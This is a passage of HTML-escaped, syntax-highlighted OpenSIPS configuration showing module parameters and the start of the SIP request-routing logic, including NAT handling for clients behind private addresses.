&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;loadmodule&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rtpproxy.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ----------------- setting module-specific parameters ---------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- mi_fifo params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- usrloc params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;   &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use SQL database 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for persistent storage and comment the previous line
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;usrloc&amp;#34;, &amp;#34;db_mode&amp;#34;, 2)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -- auth params --
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment if you are using auth module
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;calculate_ha1&amp;#34;, yes)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you set &amp;#34;calculate_ha1&amp;#34; parameter to yes (which true in this config), 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment also the following parameter)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;auth_db&amp;#34;, &amp;#34;password_column&amp;#34;, &amp;#34;password&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# !! Nathelper
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,6)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nathelper&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipping_bflag&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,8)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;modparam(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nathelper&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ping_nated_only&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;1)&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;# Ping only clients behind NAT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# -------------------------  request routing logic -------------------
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main routing logic
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;route{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# initial sanity checks -- messages with
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# max_forwards==0, or excessively long requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!mf_process_maxfwd_header&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;483&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Too Many Hops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$ml &amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;513&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Message too big&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# !! Nathelper&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# Special handling for NATed clients; first, NAT test is&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# executed: it looks for via!=received and RFC1918 addresses&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# in Contact (may fail if line-folding is used); also,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# the received test should, if completed, should check all&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# vias for rpesence of received&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;nat_uac_test&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# Allow RR-ed requests, as these may indicate that&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# a NAT-enabled proxy takes care of it; unless it is&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# a REGISTER&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; !is_present_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Record-Route&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			log&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOG:Someone trying to register from private IP, rewriting\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# This will work only for user agents that support symmetric&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# communication. We tested quite many of them and majority is&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# smart enough to be symmetric. In some phones it takes a &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# configuration option. With Cisco 7960, it is called &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# NAT_Enable=Yes, with kphone it is called &amp;#34;symmetric media&amp;#34; and &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;symmetric signalling&amp;#34;.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# Rewrite contact with source IP of signalling&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			fix_nated_contact&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;				fix_nated_sdp&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# Add direction=active to SDP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			force_rport&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;# Add rport parameter to topmost Via&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			setbflag&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;    &lt;span style=&#34;color:#75715e&#34;&gt;# Mark as NATed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# if you want sip nat pinging&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# setbflag(8);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# subsequent messages withing a dialog should take the&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# path determined by record-routing&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;loose_route&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# mark routing logic in request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: rr-enforced\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# we record-route all messages -- to make sure that&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# subsequent messages will go through our proxy; that&amp;#39;s&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# particularly good if upstream and downstream entities&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# use different transport protocol&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		record_route&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# mark routing logic in request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# if the request is for other domain use UsrLoc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# (in case, it does not work, use the following command&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# with proper names and addresses in it)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;REGISTER&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;# Uncomment this if you want to use digest authentication&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#if (!www_authorize(&amp;#34;siphub.org&amp;#34;, &amp;#34;subscriber&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#75715e&#34;&gt;#	www_challenge(&amp;#34;siphub.org&amp;#34;, &amp;#34;0&amp;#34;);&lt;/span&gt;
